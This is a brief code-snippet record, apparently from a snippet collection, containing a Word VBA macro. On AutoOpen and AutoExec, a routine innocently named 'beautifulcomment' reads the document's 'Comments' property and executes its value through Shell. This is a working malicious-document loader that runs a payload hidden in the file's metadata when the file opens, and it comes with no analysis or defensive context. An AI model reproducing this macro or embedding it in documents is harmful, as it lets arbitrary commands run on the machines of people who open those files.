---
id: f8900dc5-3c7c-487f-8660-23936be1c70a
type: code
language: vb
verified: false
created_at: '2023-04-06T03:56:23.499064+00:00'
updated_at: '2023-04-10T20:36:48.956254+00:00'
---

# Code Snippet f8900dc5

**Language**: vb

```vb
Sub beautifulcomment()
    Dim p As DocumentProperty
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = "Comments" Then
            Shell (p.Value)
        End If
    Next
End Sub

Sub AutoExec()
    beautifulcomment
End Sub

Sub AutoOpen()
    beautifulcomment
End Sub
```
